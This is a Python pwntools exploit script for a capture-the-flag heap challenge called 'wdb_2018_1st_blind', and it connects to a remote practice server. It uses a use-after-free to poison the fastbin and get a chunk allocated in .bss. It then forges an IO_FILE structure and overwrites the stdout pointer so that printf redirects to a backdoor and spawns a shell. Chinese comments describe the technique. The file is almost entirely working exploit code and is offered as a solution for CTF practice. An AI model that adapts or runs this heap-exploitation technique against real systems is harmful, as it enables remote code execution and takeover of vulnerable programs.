# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './wdb_2018_1st_blind'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25701'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(idx,content):
    cmd(1)
    sla('Index:',idx)
    sla('Content:',content)

def edit(idx,content):
    cmd(2)
    sla('Index:',idx)
    sla('Content:',content)

def delete(idx):
    cmd(3)
    sla('Index:',idx)


# one_gad = one_gadget(libc.path)
backdoor = 0x4008E3
fake_chunk_in_bss = 0x601FF5

add(0 , 'a'*0x60)
delete(0)
edit(0,p64(fake_chunk_in_bss))
add(1 , 'a'*0x60)

#伪造一个IO_FILE
fack_io  = flat( fake_chunk_in_bss + 0xB , 0 ,fake_chunk_in_bss + 0x10)
fack_io += '\x00'*0x3 +  flat(fake_chunk_in_bss - 0x78 , backdoor) + '\x00'*0x25 + p64(0x601FF0)

#申请到bss上，篡改stdout指针，伪造IO_FILE，当调用printf时，会getshell
add(2,fack_io)

p.interactive()

'''
@File    :   wdb_2018_1st_blind.py
@Time    :   2021/08/25 12:34:17
@Author  :   Niyah 
'''